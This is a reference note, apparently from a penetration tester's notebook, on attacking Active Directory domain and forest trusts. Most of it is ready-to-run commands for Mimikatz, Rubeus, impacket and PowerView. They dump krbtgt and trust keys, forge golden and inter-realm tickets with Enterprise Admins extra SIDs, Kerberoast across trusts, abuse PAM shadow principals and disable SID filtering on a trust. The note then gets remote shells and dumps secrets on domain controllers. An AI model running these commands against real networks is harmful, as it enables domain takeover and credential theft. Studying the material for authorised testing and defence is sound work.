---
title: "Active Directory Trust and Forest Attacks Reference"
created: "2026-04-15"
type: reference-note
status: active
tags:
  - active-directory
  - trust
  - forest
  - sid-hijacking
  - inter-realm
---

# Active Directory Trust and Forest Attacks Reference

Reference for abusing domain and forest trust relationships including SID hijacking, inter-realm ticket forging, and PAM trust abuse. See also: [[AD-Kerberos-Attacks]], [[AD-Enumeration-Reference]], [[Active-Directory-Cheatsheet]].

---

## Table of Contents

- [[#Trust Enumeration]]
- [[#Trust Types and Directions]]
- [[#SID Hijacking (Extra SIDs Attack)]]
- [[#Inter-Realm Trust Ticket Forging]]
- [[#Cross-Domain Kerberoasting]]
- [[#PAM (Privileged Access Management) Trust Abuse]]
- [[#Forest Trust Abuse]]

---

## Trust Enumeration

```powershell
# PowerView
Get-NetDomainTrust
Get-NetForestTrust
Get-NetForestDomain
Invoke-MapDomainTrust
Get-DomainTrust -Domain corp.local

# AD Module
Get-ADTrust -Filter *
Get-ADTrust -Filter * -Server corp.local

# netexec
netexec smb <DC_IP> -u jdoe -p password --trusted-for-delegation

# nltest
nltest /trusted_domains
nltest /domain_trusts
nltest /dclist:corp.local
```

---

## Trust Types and Directions

| Trust Type | Direction | Description |
|-----------|-----------|-------------|
| Parent-Child | Two-way | Auto-created between parent and child domains |
| Tree-Root | Two-way | Between root domains in a forest |
| External | One-way or Two-way | Between separate forests or domains |
| Forest | One-way or Two-way | Between two forests (requires Forest functional level) |
| Shortcut | One-way or Two-way | Manually created to speed up authentication |
| Realm | One-way or Two-way | Between Windows AD and non-Windows Kerberos realm |

**Trust Direction for Attack:**
- In a **one-way trust** where A trusts B: users in B can access resources in A
- In a **two-way trust**: users in both domains can access resources in the other

---

## SID Hijacking (Extra SIDs Attack)

Abuse SID History attribute by including SIDs from a trusted domain in the PAC of a forged ticket. Used to escalate from a compromised child domain to parent/root domain.

**Requirements:**
- Control of child domain (krbtgt hash of child domain)
- Knowledge of parent domain's Enterprise Admins SID

### Enumeration

```powershell
# Get child domain SID
Get-ADDomain -Identity child.corp.local | Select DomainSID

# Get parent domain SID and EA SID
Get-ADDomain -Identity corp.local | Select DomainSID
# Enterprise Admins SID = ParentDomainSID + "-519"

# Get trust key (krbtgt hash of child domain)
lsadump::dcsync /domain:child.corp.local /user:krbtgt
```

### Exploitation

```bash
# impacket ticketer with extra SID
impacket-ticketer -nthash <CHILD_KRBTGT_HASH> \
    -domain-sid <CHILD_DOMAIN_SID> \
    -domain child.corp.local \
    -extra-sid <PARENT_DOMAIN_SID>-519 \
    administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local
```

```powershell
# Mimikatz - create golden ticket with extra SID
kerberos::golden /user:administrator \
    /domain:child.corp.local \
    /sid:<CHILD_DOMAIN_SID> \
    /krbtgt:<CHILD_KRBTGT_HASH> \
    /sids:<PARENT_DOMAIN_SID>-519 \
    /ticket:golden.kirbi
kerberos::ptt golden.kirbi

# Rubeus
.\Rubeus.exe golden /rc4:<CHILD_KRBTGT_HASH> \
    /domain:child.corp.local \
    /sid:<CHILD_DOMAIN_SID> \
    /sids:<PARENT_DOMAIN_SID>-519 \
    /user:administrator \
    /ptt
```

---

## Inter-Realm Trust Ticket Forging

When you have compromised a domain and have access to the inter-realm trust key (krbtgt account of the trusted domain), you can forge tickets valid in the trusting domain.

### Getting the Trust Key

```powershell
# Mimikatz - dump trust keys from DC
lsadump::trust /patch
lsadump::dcsync /domain:corp.local /user:CHILD$   # Child DC machine account
```

### Forging Inter-Realm TGT

```bash
# impacket ticketer
impacket-ticketer -nthash <TRUST_KEY> \
    -domain-sid <CHILD_DOMAIN_SID> \
    -domain child.corp.local \
    -extra-sid <PARENT_DOMAIN_SID>-519 \
    -spn krbtgt/corp.local \
    administrator
```

```powershell
# Mimikatz kerberos::golden with trust account
kerberos::golden /user:administrator \
    /domain:child.corp.local \
    /sid:<CHILD_DOMAIN_SID> \
    /rc4:<TRUST_KEY> \
    /service:krbtgt \
    /target:corp.local \
    /sids:<PARENT_DOMAIN_SID>-519 \
    /ticket:trust_ticket.kirbi
```

---

## Cross-Domain Kerberoasting

If there are cross-domain trust relationships, Kerberoastable accounts in a trusted domain may be accessible.

```powershell
# PowerView - find cross-domain Kerberoastable users
Get-DomainUser -SPN -Domain external.corp.local

# Invoke-Kerberoast across trusts
Invoke-Kerberoast -Domain external.corp.local
```

```bash
# impacket GetUserSPNs with external domain
impacket-GetUserSPNs corp.local/jdoe:password -dc-ip <DC_IP> -target-domain external.corp.local
```

---

## PAM (Privileged Access Management) Trust Abuse

PAM trust creates a one-way trust from a production forest to a bastion/admin forest. Shadow security principals in the bastion forest are mapped to groups in the production forest.

**Attack scenario:** If we compromise the bastion forest, we can use shadow principals to access the production forest with high privileges.

### Enumeration

```powershell
# Check for PAM trust
Get-ADTrust -Filter {TrustAttributes -band 64}  # 64 = TRUST_ATTRIBUTE_PIM_TRUST
netdom trust corp.local /domain:bastion.local /enumerate

# Enumerate shadow security principals
Get-ADObject -Filter {ObjectClass -eq "msDS-ShadowPrincipal"} -SearchBase "CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local" -Properties msDS-ShadowPrincipalSid,member
```

### Exploitation

```powershell
# If you have DA in bastion.local, check which bastion groups map to production DAs
# Get shadow principal info
$ShadowPrincipals = Get-ADObject -Filter {ObjectClass -eq "msDS-ShadowPrincipal"} `
    -SearchBase "CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local" `
    -Properties msDS-ShadowPrincipalSid, member, name

# Find members of shadow principals and their production SIDs
foreach ($sp in $ShadowPrincipals) {
    Write-Host "Shadow Principal: $($sp.Name)"
    Write-Host "Production SID: $($sp.'msDS-ShadowPrincipalSid')"
    Write-Host "Members: $($sp.member)"
}
```

---

## Forest Trust Abuse

### SID Filtering Bypass

By default, SID filtering blocks SID history attacks across forest trusts. However, some trust configurations disable SID filtering.

```powershell
# Check if SID filtering is disabled (quarantine = false)
Get-ADTrust -Filter * | Select Name,TrustAttributes
# TRUST_ATTRIBUTE_QUARANTINED_DOMAIN (0x4) = SID filtering enabled
# If bit not set, SID filtering may be disabled

# netdom check
netdom trust corp.local /domain:external.corp.local /quarantine
```

### TDO (Trusted Domain Object) Manipulation

```powershell
# Read TDO attributes
Get-ADObject -Filter {ObjectClass -eq "trustedDomain"} -Properties *

# Modify trust (requires DA)
$TDO = Get-ADObject -Filter {Name -eq "external.corp.local"} -Properties TrustAttributes
Set-ADObject -Identity $TDO -Replace @{TrustAttributes=($TDO.TrustAttributes -band -bnot 4)}  # Disable quarantine
```

### Cross-Forest Kerberoasting

```bash
# If two-way trust exists, Kerberoast users in remote forest
impacket-GetUserSPNs corp.local/jdoe:password -target-domain remote.local -dc-ip <CORP_DC>
```

---

## Summary: Trust Attack Paths

```
Child Domain DA → Parent Domain DA
  Method: Golden ticket with Extra SIDs (-519)
  Required: Child domain krbtgt hash + parent domain SID

Compromised Domain → External Domain (two-way trust)
  Method: Cross-domain Kerberoasting or SID history (if SID filtering disabled)

Bastion Forest (PAM trust) → Production Forest
  Method: Shadow security principals give access to production resources
```
